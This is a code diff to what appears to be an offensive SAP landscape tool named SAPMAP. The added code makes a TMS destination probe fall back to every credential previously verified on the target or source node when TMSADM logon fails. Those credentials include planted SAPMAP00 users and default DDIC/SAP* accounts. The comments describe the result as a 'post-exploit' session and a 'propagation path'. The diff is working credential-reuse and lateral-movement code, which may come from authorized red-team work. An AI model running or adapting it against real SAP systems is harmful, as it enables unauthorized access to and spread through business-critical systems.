@@ -332,6 +332,118 @@ def _make_creds(dest: TMSDestination) -> Credentials:
     )
 
 
+def _collect_fallback_creds(dest: TMSDestination,
+                             state: "SAPMAPState" = None) -> list:
+    """Collect ``(creds, source_label)`` pairs we can try against the
+    target host when TMSADM logon fails.  Order = preference:
+
+      1. Target node's own verified credentials (SAPMAP00 first, then
+         any other verified) — proves the target accepts these creds
+         end-to-end and gives us a working session for post-exploit.
+      2. Source node's SAPMAP00 (if that user happens to exist on the
+         target too, which is common in landscapes where SAPMAP has
+         propagated already).
+      3. All verified creds from the source node — last resort.
+
+    Dedupes by ``(username, client)`` so we never try the same
+    credential twice.
+    """
+    seen = set()   # (user_upper, client)
+    out  = []      # (creds, label)
+
+    def _add(cred, label):
+        if not cred or not cred.username or not cred.password:
+            return
+        key = (cred.username.upper(), (cred.client or "").strip())
+        if key in seen:
+            return
+        seen.add(key)
+        # Never re-try TMSADM with the SecStore password we just failed
+        # with — the caller already tried it.
+        if (cred.username.upper() == "TMSADM"
+                and cred.password == dest.password
+                and (cred.client or "000") == (dest.target_client or "000")):
+            return
+        out.append((cred, label))
+
+    tgt_sid = (dest.target_sid or "").upper()
+
+    if state is not None:
+        # Target node's own verified creds (SAPMAP00 pinned by a prior
+        # user-create transport, DDIC via default-creds, …).
+        tgt = state.get_node(tgt_sid)
+        if tgt is not None:
+            for c in (tgt.credentials or []):
+                if getattr(c, "verified", False):
+                    # SAPMAP00 first
+                    if (c.username or "").upper().startswith("SAPMAP"):
+                        _add(c, f"{tgt_sid}.credentials (SAPMAP-family)")
+            for c in (tgt.credentials or []):
+                if (getattr(c, "verified", False)
+                        and not (c.username or "").upper().startswith("SAPMAP")):
+                    _add(c, f"{tgt_sid}.credentials")
+
+        # Source node's SAPMAP00 — landscape-shared user (common
+        # after prior SAPMAP propagation).
+        src = state.get_node(dest.source_sid)
+        if src is not None:
+            for c in (src.credentials or []):
+                if (getattr(c, "verified", False)
+                        and (c.username or "").upper().startswith("SAPMAP")):
+                    _add(c, f"{dest.source_sid}.credentials (SAPMAP-shared)")
+            for c in (src.credentials or []):
+                if (getattr(c, "verified", False)
+                        and not (c.username or "").upper().startswith("SAPMAP")):
+                    _add(c, f"{dest.source_sid}.credentials")
+
+    return out
+
+
+def _try_fallback_logon(tgt_node: SAPNode, dest: TMSDestination,
+                         state: "SAPMAPState" = None) -> None:
+    """Attempt every credential in ``_collect_fallback_creds`` against
+    the target.  First one that connects wins; sets ``dest.host_reachable``
+    + ``dest.reachable_via``.  Does NOT touch ``dest.logon_ok`` — that
+    remains the specific "TMSADM logon works" signal.
+    """
+    try:
+        from sapmap_rfc import _get_connection
+    except Exception as e:
+        dest.fallback_error = f"sapmap_rfc import failed: {e}"
+        return
+
+    candidates = _collect_fallback_creds(dest, state)
+    if not candidates:
+        dest.fallback_error = ("no fallback credentials available "
+                                "(no verified creds on target or source)")
+        print(f"    [-] {dest.source_sid}: no fallback creds to try "
+              f"against {dest.target_sid}")
+        return
+
+    print(f"    [*] {dest.source_sid}: trying {len(candidates)} "
+          f"fallback credential(s) against {dest.target_sid}...")
+    last_err = ""
+    for cred, label in candidates:
+        try:
+            with _get_connection(tgt_node, cred) as _c:
+                dest.host_reachable = True
+                dest.reachable_via  = f"{cred.username}@{cred.client}"
+                dest.error += (f" — but host reachable via "
+                                f"{cred.username}@{cred.client} "
+                                f"from {label}")
+                print(f"    [+] {dest.source_sid}: fallback logon OK — "
+                      f"{cred.username}@{cred.client} from {label}")
+                return
+        except Exception as e:
+            last_err = f"{cred.username}@{cred.client}: {type(e).__name__}: {str(e)[:120]}"
+            print(f"    [-] {dest.source_sid}: fallback "
+                  f"{cred.username}@{cred.client} failed: "
+                  f"{type(e).__name__}: {str(e)[:80]}")
+    dest.fallback_error = last_err
+    print(f"    [-] {dest.source_sid}: all {len(candidates)} fallback "
+          f"cred(s) failed against {dest.target_sid}")
+
+
 def _resolve_missing_host(dest: TMSDestination,
                             state: SAPMAPState = None) -> str:
     """When dest.target_host is empty (TMSCSYS read during discovery
@@ -470,6 +582,9 @@ def probe_tms_destination(dest: TMSDestination,
         return
 
     creds = _make_creds(dest)
+    dest.host_reachable = False
+    dest.reachable_via  = ""
+    dest.fallback_error = ""
     print(f"[*] {dest.source_sid}: TMS probe → TMSADM@"
           f"{dest.target_sid} at {dest.target_host}:00 (domain "
           f"{dest.domain}"
@@ -478,12 +593,22 @@ def probe_tms_destination(dest: TMSDestination,
     try:
         with _get_connection(tgt_node, creds) as _c:
             dest.logon_ok = True
+            dest.host_reachable = True
+            dest.reachable_via  = f"TMSADM@{creds.client}"
             print(f"[+] {dest.source_sid}: TMSADM logon to "
                   f"{dest.target_sid} succeeded")
     except Exception as e:
-        dest.error = f"logon failed: {type(e).__name__}: {str(e)[:200]}"
+        dest.error = f"TMSADM logon failed: {type(e).__name__}: {str(e)[:200]}"
         print(f"[-] {dest.source_sid}: TMSADM logon to "
               f"{dest.target_sid} failed: {dest.error}")
+        # Fallback: try any other credential we know that might work
+        # against this target — SAPMAP00 on the target node, DDIC/SAP*
+        # from default-creds, the source's own SAPMAP00 (if it happens
+        # to exist on the target too), etc.  Success here proves the
+        # host is up and gives Bundle 3 an alternative propagation
+        # path.  Does NOT set logon_ok — that stays reserved for
+        # TMSADM.
+        _try_fallback_logon(tgt_node, dest, state)
         return
 
     # Once logon succeeded — fetch TMSADM's profile assignments.
